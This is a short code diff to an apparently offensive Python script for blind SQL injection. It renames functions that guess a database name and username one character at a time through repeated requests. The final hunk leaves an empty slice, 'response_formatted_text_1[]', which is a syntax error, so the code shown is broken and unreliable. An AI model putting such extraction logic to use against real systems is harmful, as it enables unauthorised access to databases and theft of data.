@@ -32,7 +32,7 @@ def username_length(payload , validator):
     return username_length
 
 
-def username_length_finder(payload, validator):
+def length_finder(payload, validator):
     response = False
     i = 0
     while (response == False):
@@ -55,7 +55,7 @@ def username_length_finder(payload, validator):
 
 
 
-def database_name_finder(payload, validator):
+def find_database_name(payload, validator):
     i = 0
     a = 32
     ascii_max = 127
@@ -98,7 +98,7 @@ def database_name_finder(payload, validator):
     return database_name
 
 
-def username_finder(payload, validator):
+def find_username(payload, validator):
     i = 0
     a = 32
     ascii_max = 127
@@ -127,7 +127,7 @@ def username_finder(payload, validator):
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
-            if (validator == response_formatted_text_1[505:513]):
+            if (validator == response_formatted_text_1[]):
                 database_name_list.append(chr(a))
                 a = 32
                 break
